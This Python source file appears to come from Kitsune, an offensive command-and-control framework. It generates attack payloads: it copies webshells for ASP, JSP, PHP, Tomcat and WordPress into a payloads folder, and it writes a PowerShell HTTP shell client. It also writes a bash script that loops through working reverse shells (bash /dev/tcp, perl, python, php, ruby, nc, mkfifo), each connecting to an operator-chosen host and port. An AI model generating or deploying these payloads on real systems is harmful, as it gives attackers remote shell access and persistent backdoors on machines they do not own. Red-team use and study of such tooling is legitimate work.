#!/usr/bin/python3
#=========================#
#  Kitsune by @JoelGMSec  #
#    https://darkbyte.net #
#=========================#

import os
import shutil

def generate_webshell(app, tail, format, obfuscate):
    payloads_dir = "payloads"
    os.makedirs(payloads_dir, exist_ok=True)

    if format == "Asp":
        src_file = "tails/PyShell/Shells/shell.asp"
        dst_file = os.path.join(payloads_dir, "webshell.asp")
        shutil.copy(src_file, dst_file)

    if format == "Aspx":
        src_file = "tails/PyShell/Shells/shell.aspx"
        dst_file = os.path.join(payloads_dir, "webshell.aspx")
        shutil.copy(src_file, dst_file)

    if format == "Jsp":
        src_file = "tails/PyShell/Shells/shell.jsp"
        dst_file = os.path.join(payloads_dir, "webshell.jsp")
        shutil.copy(src_file, dst_file)
    
    if format == "Php":
        src_file = "tails/PyShell/Shells/shell.php"
        dst_file = os.path.join(payloads_dir, "webshell.php")
        shutil.copy(src_file, dst_file)

    if format == "Python 3":
        src_file = "tails/PyShell/Shells/shell.py"
        dst_file = os.path.join(payloads_dir, "webshell.py")
        shutil.copy(src_file, dst_file)

    if format == "Shell":
        src_file = "tails/PyShell/Shells/shell.sh"
        dst_file = os.path.join(payloads_dir, "webshell.sh")
        shutil.copy(src_file, dst_file)

    if format == "Tomcat":
        src_file = "tails/PyShell/Shells/tomcat.war"
        dst_file = os.path.join(payloads_dir, "tomcat.war")
        shutil.copy(src_file, dst_file)

    if format == "Wordpress":
        src_file = "tails/PyShell/Shells/wordpress.zip"
        dst_file = os.path.join(payloads_dir, "wordpress.zip")
        shutil.copy(src_file, dst_file)

    app.generate_success()

def generate_payload(app, tail, file_format, listener_name):
    payloads_dir = "payloads"
    os.makedirs(payloads_dir, exist_ok=True)

    for listener in app.listeners:
        if listener["Name"] == listener_name:  
            listener_host = listener["Host"]
            listener_port = listener["Port"]
            break

    if tail == "HTTP-Shell":
        if file_format == "Ps1":
            src_file = "tails/HTTP-Shell/HTTP-Client.ps1"
            dst_name = "HTTP-Shell_" + str(listener_port) + ".ps1"
            dst_file = os.path.join(payloads_dir, dst_name.lower())
            
            with open(src_file, 'r') as file:
                content = file.readlines()
            
            content.insert(0, "function HTTP-Shell {\n")
            content.append(f"\n}}\n\nHTTP-Shell -c {listener_host}:{listener_port}\n")
            
            with open(dst_file, 'w') as file:
                file.writelines(content)

    elif tail == "PwnCat-CS":
        if file_format == "Bash":
            dst_name = "PwnCat_" + str(listener_port) + ".sh"
            dst_file = os.path.join(payloads_dir, dst_name.lower())

            content = f"""#!/bin/bash

HOST={listener_host}
PORT={listener_port}

try_bash() {{
    /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1
}}

try_perl() {{
    perl -e 'use Socket;$i="'"$HOST"'";$p='"$PORT"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
}}

try_python() {{
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$HOST"'",'"$PORT"'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
}}

try_php() {{
    php -r '$sock=fsockopen("'"$HOST"'",'"$PORT"');exec("/bin/sh -i <&3 >&3 2>&3");'
}}

try_ruby() {{
    ruby -rsocket -e'f=TCPSocket.open("'"$HOST"'",'"$PORT"'").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
}}

try_nc() {{
    nc -e /bin/sh $HOST $PORT
}}

try_mkfifo_nc() {{
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $HOST $PORT >/tmp/f
}}

reversa_shells=(try_bash try_perl try_python try_php try_ruby try_nc try_mkfifo_nc)

while true; do
    for shell in "${{reversa_shells[@]}}"; do
        if command -v $shell &>/dev/null; then
            $shell
            if [ $? -eq 0 ]; then
                break
            else
                $null
            fi
        else
            $null
        fi
    done
done
"""

            with open(dst_file, 'w') as file:
                file.write(content)

    app.generate_success()